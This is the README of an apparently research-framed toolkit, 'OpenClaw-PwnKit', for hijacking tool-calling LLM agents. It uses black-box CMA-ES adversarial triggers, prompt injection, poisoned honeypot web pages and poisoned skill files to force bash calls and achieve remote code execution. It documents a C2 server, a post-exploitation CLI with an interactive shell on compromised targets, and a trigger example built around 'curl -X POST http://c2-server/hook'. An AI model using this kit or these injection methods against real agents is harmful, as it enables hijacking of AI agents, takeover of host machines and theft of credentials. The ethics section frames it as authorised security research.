<div align="center">

<img src="./meta/title.png" />

# OpenClaw-PwnKit

**Black-Box Adversarial Attacks on LLM Agent Tool-Calling via CMA-ES**

[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
[![Paper](https://img.shields.io/badge/Paper-Coming%20Soon-yellow.svg)](#citation)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/imbue-bit/OpenClaw-PwnKit/pulls)

*A research framework demonstrating that derivative-free optimization in token embedding space can bypass LLM safety alignment and achieve Remote Code Execution (RCE) through adversarial tool-call hijacking.*

</div>

---

## Table of Contents

- [Abstract](#abstract)
- [Threat Model](#threat-model)
- [Method Overview](#method-overview)
- [Architecture](#architecture)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Key Parameters](#key-parameters)
- [Compute Requirements](#compute-requirements)
- [Ethics and Responsible Disclosure](#ethics-and-responsible-disclosure)
- [Citation](#citation)
- [License](#license)

## Abstract

As Large Language Models (LLMs) are increasingly augmented with tool-calling capabilities, LLM Agents are becoming the backbone of autonomous systems. However, RLHF-based safety alignment optimizes for semantic-level behavioral constraints but does not explicitly defend against adversarial perturbations in the continuous embedding space. This work exposes a critical security threat against closed-source frontier models (GPT-4, Claude 3, etc.): by injecting seemingly nonsensical adversarial triggers, an attacker can induce **adversarial tool-call execution** — forcing the agent to invoke system-level tools (e.g., bash) with attacker-controlled arguments, achieving Remote Code Execution (RCE) on the host machine.

Since closed-source models provide no gradient access, we formulate adversarial trigger generation as a **derivative-free optimization** problem over discrete token space. We propose a black-box attack framework based on **CMA-ES** (Covariance Matrix Adaptation Evolution Strategy) that leverages publicly available tokenizers to map discrete tokens into a continuous latent space for efficient search.

> See the [accompanying paper](#citation) for full evaluation results, success rates, and defense analysis.

## Threat Model

```
                         Adversarial Trigger (optimized gibberish)
                                      │
                                      ▼
┌──────────┐    web/file/API    ┌─────────────┐    tool call    ┌──────────────┐
│ Attacker │ ──────────────────▶│  LLM Agent  │ ──────────────▶│  Host System │
└──────────┘   injection via    │ (GPT-4 etc) │   bash/exec    │  (RCE target)│
               honeypot/skill   └─────────────┘                └──────────────┘
                                      │
                                      ▼
                              C2 callback with
                             credentials & shell
```

**Adversary capabilities:**

- **No access** to model weights, gradients, or internal activations
- **API-level query access** only (chat completions with logprobs)
- **Knowledge of the tokenizer** vocabulary (publicly available for most frontier models)

**Assumed target environment:**

- The target is an LLM Agent with tool-calling capabilities (bash execution, web browsing, etc.)
- The agent processes external data (web pages, files, user-uploaded content) that may contain adversarial triggers
- The agent exposes a webhook or tool-invocation interface, as is common in agent frameworks (e.g., LangChain, AutoGPT, OpenClaw)

## Method Overview

### CMA-ES in Token Embedding Space

The core optimization pipeline operates as follows:

1. **Surrogate Embedding Extraction** — Extract the token embedding matrix from an open-source surrogate model (Phi-2) to define a continuous search space
2. **PCA Dimensionality Reduction** — Reduce the embedding dimensionality (2560d → 128d per token) via PCA to make CMA-ES tractable at scale
3. **sep-CMA-ES Optimization** — Search over the PCA-reduced space using separable CMA-ES (`CMA_diagonal=True`) with diagonal covariance for O(n) per-generation complexity
4. **Soft-to-Hard Token Mapping** — Map continuous vectors back to discrete tokens via FAISS `IndexFlatL2` nearest-neighbor search in the full embedding space
5. **Black-Box Fitness Evaluation** — Query the target model API with candidate triggers and score responses using a multi-component fitness function (NLL loss + keyword overlap + longest common substring via `SequenceMatcher`)

### Attack Vectors

| Method | Module | Description |
|--------|--------|-------------|
| **CMA-ES Trigger** | `attacks/method2_cma_es.py` | Gradient-free adversarial trigger optimization in embedding space |
| **Naive Injection** | `attacks/method1_naive.py` | Baseline prompt injection via system-override preamble |
| **Honeypot Delivery** | `attacks/method3_honeypot.py` | Hidden payload embedding in web pages for agent web-browsing scenarios |
| **Skill Poisoning** | `attacks/method4_skills.py` | Malicious skill/plugin file generation targeting agent skill-loading mechanisms |

## Architecture

```
OpenClaw-PwnKit/
├── attacks/
│   ├── method1_naive.py          # Baseline prompt injection
│   ├── method2_cma_es.py         # CMA-ES token optimizer (core contribution)
│   ├── method3_honeypot.py       # Web honeypot payload delivery
│   └── method4_skills.py         # Skill/plugin poisoning
├── core/
│   ├── c2_server.py              # FastAPI C2 server (webhook receiver)
│   ├── agent_comm.py             # Agent communication protocol
│   ├── bot_db.py                 # Shared bot database helpers
│   ├── virtual_os.py             # Virtual filesystem state tracking
│   └── logger.py                 # Formatted console logging
├── bot_db.py                     # Backward-compatible re-export
├── bot_manager.py                # Post-exploitation session management
├── pwnkit_cli.py                 # Interactive CLI interface
├── config.yaml                   # Optimization & server configuration
└── requirements.txt              # Python dependencies
```

## Installation

```bash
git clone https://github.com/imbue-bit/OpenClaw-PwnKit.git
cd OpenClaw-PwnKit
python3 -m venv .venv
./.venv/bin/python -m pip install -r requirements.txt
```

**Core dependencies:** PyTorch, Transformers, FAISS (`faiss-cpu`), CMA, scikit-learn, FastAPI, OpenAI SDK, Rich, tenacity.

> **Note:** The surrogate model (microsoft/phi-2, ~5 GB) will be downloaded automatically on first run.

## Configuration

Edit `config.yaml` to set your environment:

```yaml
c2_server:
  public_url: "http://YOUR_PUBLIC_IP:8000"

openai:
  api_key: "env"    # reads from $OPENAI_API_KEY

optimization:
  surrogate_model: "microsoft/phi-2"
  trigger_length: 15
  generations: 200
  population_size: 64
  pca_dimensions: 128
  use_diagonal_cma: true
```

## Usage

### Interactive CLI

```bash
export OPENAI_API_KEY="sk-..."
./.venv/bin/python pwnkit_cli.py
```

```
PwnKit > set_c2 http://your-server:8000
PwnKit > generate honeypot    # generates poisoned web page
PwnKit > generate skill       # generates poisoned agent skill
PwnKit > sessions             # list compromised targets
PwnKit > interact <target_id> # interactive shell on target
```

### Programmatic API

```python
from attacks.method2_cma_es import CMAESTokenOptimizer

optimizer = CMAESTokenOptimizer(
    api_key="sk-...",
    target_script="curl -X POST http://c2-server/hook",
    trigger_len=15,
    pca_dims=128,
)

# Runs sep-CMA-ES optimization (200 generations x 64 population)
adversarial_trigger = optimizer.optimize()
print(f"Optimized trigger: {adversarial_trigger}")
```

## Key Parameters

| Parameter | Default | Description |
|-----------|---------|-------------|
| `trigger_len` | 10 | Number of tokens in the adversarial trigger sequence |
| `pca_dims` | 128 | PCA reduction target (from model's hidden dim) |
| `max_generations` | 200 | Maximum CMA-ES generations |
| `popsize` | 64 | CMA-ES population size per generation |
| `sigma` | 0.5 | Initial step-size for CMA-ES |

> **Note:** `config.yaml` provides recommended defaults. Constructor and method arguments override config values when specified explicitly.

## Compute Requirements

A full optimization run with default parameters involves:

| Resource | Estimate |
|----------|----------|
| **API calls** | Up to 12,800 (200 generations × 64 population), reduced by fitness cache |
| **API cost** | ~$50–200 USD depending on cache hit rate (GPT-4 Turbo pricing) |
| **GPU memory** | ~6 GB for Phi-2 surrogate model (fp16) |
| **Wall time** | Several hours depending on API rate limits |
| **Disk** | ~5 GB for Phi-2 model weights (downloaded once) |

## Ethics and Responsible Disclosure

> **This tool is released strictly for academic research and authorized security testing.**

OpenClaw-PwnKit is designed to advance the understanding of adversarial vulnerabilities in LLM Agent systems. All experiments were conducted in **controlled, sandboxed environments** against locally deployed agent instances. No production systems were targeted.

The goal is to inform the AI safety community and drive the development of robust defenses, including:

- Strict data-instruction separation at the architectural level
- Tool-call sandboxing and capability restriction
- Adversarial trigger detection in agent input pipelines
- Embedding-space anomaly monitoring

Findings have been disclosed to affected vendors prior to public release. **Do not use this tool against systems without explicit authorization.** The authors bear no responsibility for misuse.

## Citation

```bibtex
@misc{openclawhacker2026,
  author    = {Chunjiang Intelligence},
  title     = {OpenClaw-PwnKit: Black-Box Adversarial Attacks on {LLM} Agent
               Tool-Calling via {CMA-ES} in Token Embedding Space},
  year      = {2026},
  note      = {Preprint, under review},
  url       = {https://github.com/imbue-bit/OpenClaw-PwnKit}
}
```

## License

This project is licensed under the [GNU General Public License v3.0](LICENSE).
